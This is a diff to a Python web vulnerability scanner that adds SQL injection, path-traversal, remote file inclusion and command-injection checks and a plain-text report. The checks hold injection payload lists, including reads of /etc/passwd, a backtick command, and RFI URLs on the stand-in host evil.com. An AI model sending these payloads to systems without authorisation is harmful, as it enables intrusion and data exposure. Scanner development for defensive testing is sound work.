@@ -7,7 +7,7 @@ import socket
 import nmap
 import requests
 import threading
-from urllib.parse import urljoin, urlparse, quote
+from urllib.parse import urljoin, urlparse, quote, parse_qs
 from fake_useragent import UserAgent
 from colorama import Fore, Style, init
 import pyfiglet
@@ -33,10 +33,15 @@ class CyberScanner:
             "server_info": {},
             "hidden_pages": [],
             "security_headers": [],
-            "vulnerabilities": [],
+            "vulnerabilities": {
+                "sqli": [],
+                "xss": [],
+                "lfi": [],
+                "rfi": [],
+                "cmd_injection": [],
+                "cve": []
+            },
             "nmap_scan": {},
-            "xss_vulnerabilities": [],
-            "cve_vulnerabilities": [],
             "errors": []
         }
         self.headers = {'User-Agent': UserAgent().random}
@@ -152,6 +157,30 @@ class CyberScanner:
         except Exception as e:
             self.log_error(f"Nmap Error: {str(e)}")
 
+    def check_sqli(self):
+        sqli_payloads = [
+            "' OR 1=1--",
+            "' UNION SELECT null, version()--",
+            "admin'--",
+            "' OR '1'='1"
+        ]
+        parsed_url = urlparse(self.target)
+        query_params = parse_qs(parsed_url.query)
+
+        for param in query_params:
+            for payload in sqli_payloads:
+                test_url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
+                try:
+                    resp = requests.get(test_url, headers=self.headers, timeout=10)
+                    if "SQL syntax" in resp.text or "error in your SQL" in resp.text:
+                        self.results['vulnerabilities']['sqli'].append({
+                            'url': test_url,
+                            'payload': payload,
+                            'severity': 'Critical'
+                        })
+                except Exception as e:
+                    self.log_error(f"SQLi Check Error ({test_url}): {str(e)}")
+
     def check_xss(self):
         xss_payloads = [
             "<script>alert('XSS')</script>",
@@ -159,22 +188,90 @@ class CyberScanner:
             "<svg/onload=alert('XSS')>"
         ]
         parsed_url = urlparse(self.target)
-        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
         query_params = parse_qs(parsed_url.query)
 
         for param in query_params:
             for payload in xss_payloads:
-                test_url = f"{base_url}?{param}={quote(payload)}"
+                test_url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                 try:
                     resp = requests.get(test_url, headers=self.headers, timeout=10)
                     if payload in resp.text:
-                        self.results['xss_vulnerabilities'].append({
+                        self.results['vulnerabilities']['xss'].append({
                             'url': test_url,
                             'payload': payload,
                             'severity': 'High'
                         })
                 except Exception as e:
                     self.log_error(f"XSS Check Error ({test_url}): {str(e)}")
+
+    def check_lfi(self):
+        lfi_payloads = [
+            "../../../../etc/passwd",
+            "../../../../windows/win.ini",
+            "../../../../boot.ini"
+        ]
+        parsed_url = urlparse(self.target)
+        query_params = parse_qs(parsed_url.query)
+
+        for param in query_params:
+            for payload in lfi_payloads:
+                test_url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
+                try:
+                    resp = requests.get(test_url, headers=self.headers, timeout=10)
+                    if "root:" in resp.text or "[fonts]" in resp.text:
+                        self.results['vulnerabilities']['lfi'].append({
+                            'url': test_url,
+                            'payload': payload,
+                            'severity': 'High'
+                        })
+                except Exception as e:
+                    self.log_error(f"LFI Check Error ({test_url}): {str(e)}")
+
+    def check_rfi(self):
+        rfi_payloads = [
+            "http://evil.com/shell.txt",
+            "https://malicious.site/exploit.php"
+        ]
+        parsed_url = urlparse(self.target)
+        query_params = parse_qs(parsed_url.query)
+
+        for param in query_params:
+            for payload in rfi_payloads:
+                test_url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
+                try:
+                    resp = requests.get(test_url, headers=self.headers, timeout=10)
+                    if "Hacked" in resp.text or "exploit" in resp.text:
+                        self.results['vulnerabilities']['rfi'].append({
+                            'url': test_url,
+                            'payload': payload,
+                            'severity': 'Critical'
+                        })
+                except Exception as e:
+                    self.log_error(f"RFI Check Error ({test_url}): {str(e)}")
+
+    def check_cmd_injection(self):
+        cmd_payloads = [
+            "; ls",
+            "| dir",
+            "&& whoami",
+            "`cat /etc/passwd`"
+        ]
+        parsed_url = urlparse(self.target)
+        query_params = parse_qs(parsed_url.query)
+
+        for param in query_params:
+            for payload in cmd_payloads:
+                test_url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
+                try:
+                    resp = requests.get(test_url, headers=self.headers, timeout=10)
+                    if "root:" in resp.text or "C:\Windows" in resp.text:
+                        self.results['vulnerabilities']['cmd_injection'].append({
+                            'url': test_url,
+                            'payload': payload,
+                            'severity': 'Critical'
+                        })
+                except Exception as e:
+                    self.log_error(f"Command Injection Check Error ({test_url}): {str(e)}")
 
     def check_cve_vulnerabilities(self):
         try:
@@ -186,7 +283,7 @@ class CyberScanner:
                 if 'script' in data:
                     for script, output in data['script'].items():
                         if "CVE" in output:
-                            self.results['cve_vulnerabilities'].append({
+                            self.results['vulnerabilities']['cve'].append({
                                 'host': host,
                                 'script': script,
                                 'output': output,
@@ -202,9 +299,89 @@ class CyberScanner:
                 'message': message
             })
 
-    def generate_report(self):
+    def generate_txt_report(self):
+        report = []
+        report.append("="*80)
+        report.append(f"          CyberScanner Report - {time.strftime('%Y-%m-%d %H:%M:%S')}")
+        report.append("="*80)
+        report.append(f"\nTarget: {self.target}\n")
+
+        # IP Information
+        report.append("IP INFORMATION")
+        report.append("--------------")
+        if self.results['ip_info']:
+            for key, value in self.results['ip_info'].items():
+                report.append(f"{key.replace('_', ' ').title()}: {value}")
+        else:
+            report.append("No IP information available")
+
+        # Server Information
+        report.append("\nSERVER INFORMATION")
+        report.append("------------------")
+        if self.results['server_info']:
+            for key, value in self.results['server_info'].items():
+                report.append(f"{key.replace('_', ' ').title()}: {value}")
+        else:
+            report.append("No server information available")
+
+        # Security Headers
+        report.append("\nSECURITY HEADERS")
+        report.append("---------------")
+        if self.results['security_headers']:
+            missing = self.results['security_headers']['missing_headers']
+            report.append(f"Missing Headers: {', '.join(missing) if missing else 'None'}")
+            report.append(f"Severity: {self.results['security_headers']['severity']}")
+        else:
+            report.append("Security headers check failed")
+
+        # Hidden Pages
+        report.append("\nHIDDEN PAGES")
+        report.append("------------")
+        if self.results['hidden_pages']:
+            for page in self.results['hidden_pages']:
+                report.append(f"URL: {page['url']} (Status: {page['status_code']}, Size: {page['content_length']} bytes)")
+        else:
+            report.append("No hidden pages found")
+
+        # Vulnerabilities
+        report.append("\nVULNERABILITIES")
+        report.append("---------------")
+        for vuln_type, vulns in self.results['vulnerabilities'].items():
+            if vulns:
+                report.append(f"\n{vuln_type.upper()} ({len(vulns)} findings):")
+                for vuln in vulns:
+                    report.append(f"  - URL: {vuln['url']}")
+                    report.append(f"    Payload: {vuln.get('payload', 'N/A')}")
+                    report.append(f"    Severity: {vuln['severity']}")
+                    if 'output' in vuln:
+                        report.append(f"    Output: {vuln['output'][:100]}...")
+
+        # Nmap Scan
+        report.append("\nNMAP SCAN RESULTS")
+        report.append("-----------------")
+        if self.results['nmap_scan']:
+            for host, data in self.results['nmap_scan'].items():
+                report.append(f"Host: {host}")
+                report.append(f"  Scan Info: {data}")
+        else:
+            report.append("Nmap scan failed")
+
+        # Errors
+        report.append("\nERRORS")
+        report.append("------")
+        if self.results['errors']:
+            for error in self.results['errors']:
+                report.append(f"[{error['timestamp']}] {error['message']}")
+        else:
+            report.append("No errors encountered")
+
+        report.append("\n")
+        report.append("="*80)
+        return "\n".join(report)
+
+    def save_report(self, report_content):
         # Save report to Documents folder on Windows
-        save_path = os.path.expanduser("~/Documents/cyberscan_report.json")
+        save_path = os.path.expanduser("~/Documents/cyberscan_report.txt")
         dir_path = os.path.dirname(save_path)
         
         if not os.path.exists(dir_path):
@@ -216,8 +393,8 @@ class CyberScanner:
                 return None
 
         try:
-            with open(save_path, 'w') as f:
-                json.dump(self.results, f, indent=4)
+            with open(save_path, 'w', encoding='utf-8') as f:
+                f.write(report_content)
             return save_path
         except Exception as e:
             self.log_error(f"Report Generation Error: {str(e)}")
@@ -241,7 +418,11 @@ class CyberScanner:
             ('Hidden Pages Scan', self.check_hidden_pages),
             ('Security Headers Check', self.check_security_headers),
             ('Nmap Vulnerability Scan', self.run_nmap_scan),
+            ('SQL Injection Check', self.check_sqli),
             ('Cross-Site Scripting (XSS) Check', self.check_xss),
+            ('Local File Inclusion (LFI) Check', self.check_lfi),
+            ('Remote File Inclusion (RFI) Check', self.check_rfi),
+            ('Command Injection Check', self.check_cmd_injection),
             ('CVE Vulnerability Check', self.check_cve_vulnerabilities)
         ]
 
@@ -256,9 +437,12 @@ class CyberScanner:
                 print(f"{Colors.RED}Failed")
                 self.log_error(error_msg)
 
-        report_file = self.generate_report()
-        if report_file:
-            print(f"\n{Colors.MAGENTA}[+] Scan Completed - Report saved to: {report_file}")
+        # Generate and save TXT report
+        report_content = self.generate_txt_report()
+        report_path = self.save_report(report_content)
+        
+        if report_path:
+            print(f"\n{Colors.MAGENTA}[+] Scan Completed - Report saved to: {report_path}")
         else:
             print(f"\n{Colors.RED}[!] Report generation failed")
 
